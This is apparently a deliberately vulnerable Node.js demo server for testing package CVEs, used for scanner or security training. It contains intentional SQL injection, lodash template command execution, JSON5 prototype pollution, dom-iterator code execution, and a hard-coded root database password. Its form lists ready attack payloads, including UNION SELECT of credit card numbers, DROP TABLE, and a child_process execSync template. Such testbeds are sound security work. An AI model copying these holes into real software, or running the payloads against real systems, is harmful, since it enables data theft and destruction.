const http = require('http');
const _ = require('lodash');
const qs = require('querystring');
const semver = require('semver');
const JSON5 = require('json5');
const { sequelize, User, Password } = require('./init_db');
const sqlite3 = require("sqlite3").verbose();
const db = new sqlite3.Database("./data.db");
const mysql = require('mysql2');
const fs = require('fs');
const path = require('path');

// MySQL Connection Setup
const connection = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'topsecret',
  database: 'database'
});

connection.connect((err) => {
  if (err) {
      console.error('Error connecting to the MySQL database:', err);
  } else {
      console.log('Connected to the MySQL database.');
  }
});

const hostname = '0.0.0.0';
const port = 3000;

const server = http.createServer((req, res) => {
  if (req.method === 'GET' && req.url === '/styles.css') {
    fs.readFile(path.join(__dirname, 'styles.css'), (err, data) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Error loading styles.css');
      } else {
        res.writeHead(200, { 'Content-Type': 'text/css' });
        res.end(data);
      }
    });
  } else if (req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk.toString();
    });

    req.on('end', async () => {
      const postData = qs.parse(body);
      let responseMessages = [];

      // CVE-2024-21541: dom-iterator
      var PUT = require('dom-iterator');
      global.CTF = function() { console.log("GLOBAL.CTF HIT") } // We want to prove we can execute this by using the package

      var parser = require('mini-html-parser');
      var html = '<h1></h1>'; // Any non-empty html should work
      var parser = parser(html);
      var node = parser.parse();
      var it = PUT(node);
      var next;
      while (next = it.next("constructor.constructor('global.CTF()')()")) { }

      // Vulnerability: Missing SameSite Attribute on Cookies
      res.setHeader('Set-Cookie', `sessionToken=insecureToken; Path=/; HttpOnly; SameSite=None`);
      res.setHeader('Content-Type', 'text/html');

      // Placeholder for secret key 
      const SECRET_KEY = process.env.SECRET_KEY || 'PLACEHOLDER_SECRET_KEY';
      responseMessages.push(`<p>Current Secret Key: ${SECRET_KEY}</p>`);

      try {
        // Collect all async operations into an array of promises
        let asyncTasks = [];

        // Direct SQL Injection via Sequelize
        if (postData.orderNumber) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>1. Sequelize Injection</h3>`); // Add header immediately
          asyncTasks.push(
            (async () => {
              try {
                const query = `SELECT product FROM Orders WHERE orderNumber = ${postData.orderNumber};`;
                const result = await sequelize.query(query, { type: sequelize.QueryTypes.SELECT });
                responseMessages[index] += result.length > 0
                  ? `<p>Order details: <pre>${JSON.stringify(result, null, 2)}</pre></p>`
                  : `<p>No orders found for order number ${postData.orderNumber}</p>`;
              } catch (error) {
                responseMessages[index] += `<p>Sequelize query error: ${error.message}</p>`;
              }
            })()
          );
        }

        // Direct SQL Injection via sqlite3
        if (postData.orderNumber2) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>2. SQLite Injection</h3>`); // Add header immediately
          asyncTasks.push(
            new Promise((resolve) => {
              const query = `SELECT product FROM Orders WHERE orderNumber = ${postData.orderNumber2};`;
              db.all(query, [], (err, rows) => {
                if (err) {
                  responseMessages[index] += `<p>SQLite error: ${err.message}</p>`;
                } else {
                  responseMessages[index] += rows.length > 0
                    ? `<p>Order details: <pre>${JSON.stringify(rows, null, 2)}</pre></p>`
                    : `<p>No orders found for order number ${postData.orderNumber2}</p>`;
                }
                resolve();
              });
            })
          );
        }

        // Sequelize FindAll Injection
        if (postData.username) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>3. Sequelize FindAll Injection</h3>`); // Add header immediately
          asyncTasks.push(
            (async () => {
              try {
                const users = await User.findAll({
                  where: sequelize.literal(`username = "${postData.username}"`),
                });
                responseMessages[index] += users.length > 0
                  ? `<p>Users found: <ul>${users
                      .map((user) => `<li>Username: ${user.username}, Email: ${user.email}</li>`)
                      .join('')}</ul></p>`
                  : `<p>No users found</p>`;
              } catch (error) {
                responseMessages[index] += `<p>Sequelize findAll error: ${error.message}</p>`;
              }
            })()
          );
        }

        // Lodash Template Vulnerability
        if (postData.template) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>4. Lodash Template Vulnerability</h3>`); // Add header immediately
          asyncTasks.push(
            (async () => {
              try {
                const compiled = _.template(postData.template);
                const output = compiled({});
                console.log("Lodash Template output:", output);
                responseMessages[index] += `<p>Template executed successfully. Output logged on the server.</p>`;
              } catch (error) {
                responseMessages[index] += `<p>Lodash template error: ${error.message}</p>`;
              }
            })()
          );
        }

        // Prototype Pollution via JSON5
        if (postData.json5data) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>5. JSON5 Prototype Pollution</h3>`);
          asyncTasks.push(
            (async () => {
              try {
                const parsedObject = JSON5.parse(postData.json5data);
                if (parsedObject.polluted === "Prototype pollution successful!") {
                  responseMessages[index] += `<p>Prototype pollution detected!</p>`;
                } else {
                  responseMessages[index] += `<p>No prototype pollution detected</p>`;
                }
              } catch (error) {
                responseMessages[index] += `<p>JSON5 parsing error: ${error.message}</p>`;
              }
            })()
          );
        }

        // jQuery XSS Vulnerability
        if (postData.jqueryUrl) {
          const index = responseMessages.length;
          responseMessages.push(`<h3>6. jQuery XSS Vulnerability</h3>`); // Add header immediately
          asyncTasks.push(
            (async () => {
              const jqueryCode = `<script src="${postData.jqueryUrl}"></script>`;
              responseMessages[index] += `<p>jQuery was loaded from user-provided URL:</p><pre>${jqueryCode}</pre>`;
            })()
          );
        }

        // Wait for all async tasks to complete
        await Promise.all(asyncTasks);

        // Send combined response
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(responseMessages.join('') + `<p><a href="/">Go back</a></p>`);
      } catch (error) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('An unexpected error occurred.');
        console.error(error);
      }
    });
  } else if (req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html>
        <head>
          <link rel="stylesheet" href="styles.css">
        </head>
        <body>
          <h2>Package Vulnerability Demo</h2>
          <form action="/" method="POST">
            <!-- Direct SQL Injection via sqlite -->
            <div>
                <h3>2. Sequelize Injection</h3>
                <label for="orderNumber">Order Number:</label>
                <input type="text" id="orderNumber" name="orderNumber" value="1001 UNION SELECT creditCardNumber FROM Orders --">
                <small>Try payloads:
                    <ul>
                        <li><code>1001 UNION SELECT creditCardNumber FROM Orders --</code></li>
                        <li><code>1001; DROP TABLE Orders; --</code></li>
                    </ul>
                </small>
            </div>
            <!-- Direct SQL Injection via sqlite -->
            <div>
                <h3>3. MySQL Injection</h3>
                <label for="orderNumber">Order Number:</label>
                <input type="text" id="orderNumber2" name="orderNumber2" value="1001 UNION SELECT creditCardNumber FROM Orders --">
                <small>Try payloads:
                    <ul>
                        <li><code>1001 UNION SELECT creditCardNumber FROM Orders --</code></li>
                        <li><code>1001; DROP TABLE Orders; --</code></li>
                    </ul>
                </small>
            </div>
            <!-- 2. Sequelize SQL Injection -->
            <div>
              <h3>4. Sequelize SQL Injection (CVE-2019-10748)</h3>
              <label for="username">Username (for Sequelize Injection):</label>
              <input type="text" id="username" name="username" 
                     value='nonexistentuser" OR 1=1 --'>
              <small>Try payloads:
                <ul>
                  <li><code>nonexistentuser" OR 1=1 --</code></li>
                  <li><code>admin"; DROP TABLE Users; --</code></li>
                </ul>
              </small>
            </div>

            <!-- 5. Lodash Template Processing -->
            <div>
              <h3>5. Lodash Template Processing (CVE-2021-23337)</h3>
              <label for="template">Template String:</label>
              <textarea id="template" name="template" rows="4">
        <%= global.process.mainModule.require('child_process').execSync('ls -la') %>
              </textarea>
              <small>Try payload: <code><%= global.process.mainModule.require('child_process').execSync('ls -la') %></code></small>
            </div>

            <!-- 6. Semver ReDoS Vulnerability -->
            <div>
              <h3>6. Semver ReDoS Vulnerability (CVE-2022-25883)</h3>
              <label for="versionRange">Version Range:</label>
              <input type="text" id="versionRange" name="versionRange" 
                     value="^((((((((((((((((((a)?){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2})*$">
              <small>Try payload: <code>^((((((((((((((((((a)?){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2}){2})*$</code></small>
            </div>

            <!-- 7. JSON5 Prototype Pollution -->
            <div>
              <h3>7. JSON5 Prototype Pollution (CVE-2022-46175)</h3>
              <label for="json5data">JSON5 Data:</label>
              <textarea id="json5data" name="json5data" rows="4">{
          "__proto__": { "polluted": "Prototype pollution successful!" }
        }</textarea>
              <small>Try payload: <code>{ "__proto__": { "polluted": "Prototype pollution successful!" } }</code></small>
            </div>

            <!-- 8. jQuery XSS Vulnerability -->
            <div>
              <h3>8. jQuery XSS Vulnerability (CVE-2015-9251)</h3>
              <label for="jqueryUrl">jQuery URL:</label>
              <input type="text" id="jqueryUrl" name="jqueryUrl" 
                     value="http://sakurity.com/jqueryxss">
              <small>Try payload: <code>http://sakurity.com/jqueryxss</code></small>
            </div>
            <input type="submit" value="Submit">
          </form>
          <p>Submit to test various package vulnerabilities on the server.</p>
        </body>
      </html>
    `);
  }
});

server.listen(port, hostname, async () => {
  await sequelize.sync();
  console.log(`Server running at http://${hostname}:${port}/`);
});
